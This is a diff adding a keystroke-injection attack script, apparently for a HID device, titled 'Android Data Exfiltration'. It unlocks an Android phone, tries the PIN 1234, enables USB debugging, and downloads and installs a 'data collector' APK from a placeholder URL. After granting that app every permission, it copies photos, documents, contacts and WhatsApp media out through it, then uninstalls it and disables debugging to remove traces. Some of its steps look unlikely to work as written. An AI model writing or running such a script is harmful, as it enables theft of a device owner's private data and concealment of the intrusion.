@@ -1,0 +1,432 @@
+REM Android Data Exfiltration
+REM Author: AryanVBW
+REM Version: 1.0
+REM Extracts photos, documents, and contacts from Android devices
+
+REM ---- INITIAL SETUP ----
+DELAY 1500
+
+REM Wake up the device
+ENTER
+DELAY 500
+ENTER
+DELAY 1000
+
+REM Swipe up to unlock (universal method)
+SWIPE 500 1800 500 800
+DELAY 1500
+
+REM ---- STEP 1: ENABLE DEVELOPER OPTIONS ----
+
+REM Open Settings
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING settings
+DELAY 800
+ENTER
+DELAY 2000
+
+REM Navigate to About phone
+STRING about
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Find Build Number
+STRING build
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Tap on Build Number 7 times
+REPEAT 7 {
+    ENTER
+    DELAY 300
+}
+DELAY 1500
+
+REM Enter PIN/pattern if prompted
+STRING 1234
+DELAY 800
+ENTER
+DELAY 1500
+
+REM ---- STEP 2: ENABLE USB DEBUGGING ----
+
+REM Go back to main Settings
+BACK
+DELAY 800
+
+REM Open Developer Options
+STRING developer
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Enable USB debugging
+STRING usb debugging
+DELAY 800
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM Confirm USB debugging
+STRING allow
+DELAY 800
+TAB
+DELAY 300
+TAB
+DELAY 300
+ENTER
+DELAY 1500
+
+REM ---- STEP 3: PREPARE FOR DATA EXFILTRATION ----
+
+REM Set "Default USB configuration" to File Transfer
+STRING usb configuration
+DELAY 800
+ENTER
+DELAY 1000
+STRING file transfer
+DELAY 800
+ENTER
+DELAY 1500
+
+REM ---- STEP 4: INSTALL DATA COLLECTION APP ----
+
+REM Go to Chrome
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING chrome
+DELAY 800
+ENTER
+DELAY 3000
+
+REM Access address bar
+TAB
+DELAY 500
+ENTER
+DELAY 1000
+
+REM Enter URL for data collection app
+STRING https://example.com/data-collector.apk
+DELAY 1000
+ENTER
+DELAY 5000
+
+REM Wait for download to complete
+DELAY 10000
+
+REM Open notification shade
+SWIPE 500 100 500 1700
+DELAY 1500
+
+REM Tap on download notification
+ENTER
+DELAY 3000
+
+REM Install the app
+STRING install
+DELAY 800
+TAB
+DELAY 300
+TAB
+DELAY 300
+ENTER
+DELAY 5000
+
+REM ---- STEP 5: GRANT ALL PERMISSIONS TO THE APP ----
+
+REM Go to Settings
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING settings
+DELAY 800
+ENTER
+DELAY 2000
+
+REM Navigate to Apps
+STRING apps
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Find the data collector app
+STRING data
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Go to Permissions
+STRING permissions
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Grant all permissions
+REPEAT 10 {
+    TAB
+    DELAY 300
+    ENTER
+    DELAY 1000
+    STRING allow
+    DELAY 500
+    ENTER
+    DELAY 800
+    BACK
+    DELAY 800
+}
+
+REM ---- STEP 6: EXTRACT PHOTOS AND VIDEOS ----
+
+REM Open Files app
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING files
+DELAY 800
+ENTER
+DELAY 2000
+
+REM Navigate to DCIM folder
+STRING dcim
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Select all items
+TAB
+DELAY 300
+TAB
+DELAY 300
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+STRING select all
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Share the files
+STRING share
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Share via the data collector app
+STRING data collector
+DELAY 800
+ENTER
+DELAY 5000
+
+REM ---- STEP 7: EXTRACT CONTACTS ----
+
+REM Open Contacts app
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING contacts
+DELAY 800
+ENTER
+DELAY 2000
+
+REM Open menu
+TAB
+DELAY 300
+TAB
+DELAY 300
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM Export contacts
+STRING export
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Select export to storage
+STRING storage
+DELAY 800
+ENTER
+DELAY 2000
+
+REM ---- STEP 8: EXTRACT DOCUMENTS ----
+
+REM Open Files app again
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING files
+DELAY 800
+ENTER
+DELAY 2000
+
+REM Navigate to Documents folder
+STRING documents
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Select all items
+TAB
+DELAY 300
+TAB
+DELAY 300
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+STRING select all
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Share the files
+STRING share
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Share via the data collector app
+STRING data collector
+DELAY 800
+ENTER
+DELAY 5000
+
+REM ---- STEP 9: EXTRACT WHATSAPP MEDIA ----
+
+REM Open Files app again
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING files
+DELAY 800
+ENTER
+DELAY 2000
+
+REM Navigate to WhatsApp folder
+STRING whatsapp
+DELAY 800
+ENTER
+DELAY 1500
+STRING media
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Select all items
+TAB
+DELAY 300
+TAB
+DELAY 300
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+STRING select all
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Share the files
+STRING share
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Share via the data collector app
+STRING data collector
+DELAY 800
+ENTER
+DELAY 5000
+
+REM ---- STEP 10: CLEAN UP TRACES ----
+
+REM Go to Settings
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING settings
+DELAY 800
+ENTER
+DELAY 2000
+
+REM Navigate to Apps
+STRING apps
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Find the data collector app
+STRING data
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Clear app data
+STRING storage
+DELAY 800
+ENTER
+DELAY 1500
+STRING clear data
+DELAY 800
+ENTER
+DELAY 1000
+STRING confirm
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Uninstall the app
+BACK
+DELAY 800
+STRING uninstall
+DELAY 800
+ENTER
+DELAY 1000
+STRING confirm
+DELAY 800
+ENTER
+DELAY 2000
+
+REM ---- STEP 11: DISABLE USB DEBUGGING ----
+
+REM Go to Developer Options
+BACK
+DELAY 800
+BACK
+DELAY 800
+STRING developer
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Disable USB debugging
+STRING usb debugging
+DELAY 800
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM ---- FINISHED ----
+REM Data has been exfiltrated and traces removed
+
+REM Return to home screen
+HOME
+DELAY 800
